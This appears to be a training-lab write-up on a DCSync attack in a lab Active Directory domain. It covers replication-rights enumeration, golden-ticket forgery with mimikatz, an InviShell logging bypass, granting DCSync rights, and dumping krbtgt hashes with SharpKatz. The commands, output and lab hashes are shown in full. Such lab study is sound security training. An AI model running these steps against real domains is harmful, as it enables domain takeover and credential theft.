# Hands-On 16:

```
Later during the extra lab time:
- Check if studentuserx has Replication (DCSync) rights.
- If yes, execute the DCSync attack to pull hashes of the krbtgt user.
- If no, add the replication rights for the studentuserx and execute the DCSync attack to pull
hashes of the krbtgt user.

```

## Index Of Content:
  1. [Check replication rigths](#check-replication-rigths)
  2. [Add replication rigths](#add-replication-rigths)
  3. [Execute DCSync attack to pull hashes of krbtgt](#execute-dcsync-attack-to-pull-hashes-of-krbtgt)


### Check replication rigths

Review replication richts for student group:

```
 Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(COnvert-SidToName $_.SecurityIdentifier); $_} | ?{$_.IdentityName -like '*student' }
```

Review all replication rigths across the us.techcorp.local domain:

```
Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(COnvert-SidToName $_.SecurityIdentifier); $_}


AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-1147
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           :

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2781415573-3701854478-2406986946-1104
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : TECHCORP\MSOL_16fb75d0227d

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2781415573-3701854478-2406986946-498
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : TECHCORP\Enterprise Read-only Domain Controllers

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-1147
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           :

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2781415573-3701854478-2406986946-1104
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : TECHCORP\MSOL_16fb75d0227d

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-516
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : US\Domain Controllers

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-1147
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           :

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : GenericAll
ObjectAceType          : ms-Exch-Dynamic-Distribution-List
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2781415573-3701854478-2406986946-1105
AccessMask             : 983551
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : TECHCORP\Organization Management

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : GenericAll
ObjectAceType          : ms-Exch-Dynamic-Distribution-List
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-2781415573-3701854478-2406986946-1120
AccessMask             : 983551
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : TECHCORP\Exchange Trusted Subsystem

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : GenericAll
ObjectAceType          : All
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-2781415573-3701854478-2406986946-1120
AccessMask             : 983551
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit, InheritOnly
InheritedObjectAceType : ms-Exch-Active-Sync-Devices
OpaqueLength           : 0
IdentityName           : TECHCORP\Exchange Trusted Subsystem

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : GenericAll
ObjectAceType          : All
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-2781415573-3701854478-2406986946-1120
AccessMask             : 983551
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit, InheritOnly
InheritedObjectAceType : ms-Exch-Public-Folder
OpaqueLength           : 0
IdentityName           : TECHCORP\Exchange Trusted Subsystem

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-544
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : BUILTIN\Administrators

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-544
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : BUILTIN\Administrators

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 44
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-32-544
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : BUILTIN\Administrators

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-9
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : Enterprise Domain Controllers

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 40
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-9
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : Enterprise Domain Controllers

AceType               : AccessAllowed
ObjectDN              : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2781415573-3701854478-2406986946-519
AccessMask            : 983551
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
IdentityName          : TECHCORP\Enterprise Admins

AceType               : AccessAllowed
ObjectDN              : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags      : None
BinaryLength          : 20
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-18
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
IdentityName          : Local System
```

### Add replication rigths

Set permissions with user : Adminsitrator of the target domain us.techcorp.local:
1. Using mimikatz impersonate domain administrator and validate TGS ticket:
```
C:\Windows\system32>C:\AD\Tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt
User      : Administrator
Domain    : us.techcorp.local (US)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 - aes256_hmac
Lifetime  : 3/20/2023 9:22:10 AM ; 3/20/2023 7:22:10 PM ; 3/27/2023 9:22:10 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ us.techcorp.local' successfully submitted for current session

mimikatz # winrs -r:us-dc.techcorp.local cmd
ERROR mimikatz_doLocal ; "winrs" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # exit
Bye!

C:\Windows\system32>klist

Current LogonId is 0:0x7c848

Cached Tickets: (1)

#0>     Client: Administrator @ us.techcorp.local
        Server: krbtgt/us.techcorp.local @ us.techcorp.local
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/20/2023 9:22:10 (local)
        End Time:   3/20/2023 19:22:10 (local)
        Renew Time: 3/27/2023 9:22:10 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

C:\Windows\system32>winrs -r:us-dc cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>whomai
whomai
'whomai' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator>whoami
whoami
us\administrator

```
2. Set DCSync provileges for the user studentuser17 using PowerView module:
```
C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\Windows\system32>set COR_ENABLE_PROFILING=1

C:\Windows\system32>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Windows\system32>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.

C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
PS C:\Windows\system32> Import-Module C:\AD\Tools\PowerView.ps1
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\Windows\system32> Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser17 -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://US-DC.US.TECHCORP.LOCAL/DC=us,DC=techcorp,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=studentuser17)(name=studentuser17)(displayname=studentuser17))))
VERBOSE: [Get-DomainSearcher] search base: LDAP://US-DC.US.TECHCORP.LOCAL/DC=us,DC=techcorp,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=dc=us,dc=techcorp,dc=local)))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=studentuser17,CN=Users,DC=us,DC=techcorp,DC=local 'DCSync' on
DC=us,DC=techcorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=studentuser17,CN=Users,DC=us,DC=techcorp,DC=local rights GUID
'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=us,DC=techcorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=studentuser17,CN=Users,DC=us,DC=techcorp,DC=local rights GUID
'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on DC=us,DC=techcorp,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=studentuser17,CN=Users,DC=us,DC=techcorp,DC=local rights GUID
'89e95b76-444d-4c62-991a-0facbeda640c' on DC=us,DC=techcorp,DC=local
PS C:\Windows\system32>


```

4. Validate the  previleges with the query of the previous ACL oneliner:

```
PS C:\Windows\system32> Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(COnvert-SidToName $_.SecurityIdentifier); $_} | ?{$_.IdentityName -like '*student*' }


AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-16107
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : US\studentuser17

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-16107
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : US\studentuser17

AceQualifier           : AccessAllowed
ObjectDN               : DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-All
ObjectSID              : S-1-5-21-210670787-2521448726-163245708
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-16107
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : US\studentuser17
```
### Execute DCSync attack to pull hashes of krbtgt

Dump hashes of krbtgt user with shapkartz binary, and DCsync functionallity:
```
C:\Users\studentuser17>C:\AD\Tools\SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] us.techcorp.local will be the domain
[!] us-dc.us.techcorp.local will be the DC server
[!] us\krbtgt will be the user account
[*]
[*] Object RDN           : krbtgt
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : krbtgt
[*] User Principal Name  :
[*] Account Type         : USER_OBJECT
[*] User Account Control : ACCOUNTDISABLE, NORMAL_ACCOUNT
[*] Account expiration   : 12/31/9999 11:59:59 PM
[*] Password last change : 7/5/2019 12:49:17 AM
[*] Object Security ID   : S-1-5-21-210670787-2521448726-163245708-502
[*] Object Relative ID   : 502
[*]
[*] Credents:
[*] Hash NTLM            : b0975ae49f441adc6b024ad238935af5
[*] ntlm- 0              : b0975ae49f441adc6b024ad238935af5
[*] lm  - 0              : d765cfb668ed3b1f510b8c3861447173
[*]
[*] Supplemental Credents:
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*]     Random Value : 819a7c8674e0302cbeec32f3f7b226c9
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*]     Default Salt :US.TECHCORP.LOCALkrbtgt
[*]     Credents
[*]     aes256_hmac       4096: 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
[*]     aes128_hmac       4096: 1bae2a6639bb33bf720e2d50807bf2c1
[*]     des_cbc_md5       4096: 923158b519f7a454
[*]     ServiceCredents
[*]     OldCredents
[*]     OlderCredents
[*]
[*]  * Primary:Kerberos
[*]     Default Salt :US.TECHCORP.LOCALkrbtgt
[*]     Credents
[*]     des_cbc_md5       : 923158b519f7a454
[*]     OldCredents
[*]
[*]  * Packages
[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos WDigest
[*]
[*]  * Primary:WDigest
[*]     01 a1bdf6146e4b13c939093eb2d72416c9
[*]     02 cd864c0d5369adad4fc59a469a2d4d17
[*]     03 2123179b0ab5c0e37943e346ef1f9d9a
[*]     04 a1bdf6146e4b13c939093eb2d72416c9
[*]     05 cd864c0d5369adad4fc59a469a2d4d17
[*]     06 3449e5615d5a09bbc2802cefa8e4f9d4
[*]     07 a1bdf6146e4b13c939093eb2d72416c9
[*]     08 296114c8d353f7435b5c3ac112523ba4
[*]     09 296114c8d353f7435b5c3ac112523ba4
[*]     10 5d504fb94f1bcca78bd048de9dad69e4
[*]     11 142c7fde1e3cb590f54e12bbfdecfbe4
[*]     12 296114c8d353f7435b5c3ac112523ba4
[*]     13 13db8df6b262a6013f78b082a72add2c
[*]     14 142c7fde1e3cb590f54e12bbfdecfbe4
[*]     15 b024bdda9bdb86af00c3b2503c3bf620
[*]     16 b024bdda9bdb86af00c3b2503c3bf620
[*]     17 91600843c8dadc79e72a753649a05d75
[*]     18 423730024cfbbc450961f67008a128a5
[*]     19 d71f700d63fa4510477342b9dc3f3cc7
[*]     20 bad6b9122f71f8cfd7ea556374d381d9
[*]     21 52c6560f77613d0dcf460476da445d93
[*]     22 52c6560f77613d0dcf460476da445d93
[*]     23 23504d9f1325c5cf68892348f26e77d7
[*]     24 8228bd623c788b638fce1368c6b3ef44
[*]     25 8228bd623c788b638fce1368c6b3ef44
[*]     26 a2659c1d9fa797075b1fabdee926569b
[*]     27 784f5fbc5276dcc8f88bbcdfa27b65d8
[*]     28 2ac6c7c1c24262b424f85e1ab762f1d3
[*]     29 4bef285b22fd87f4868be352958dcb9e
[*]


```
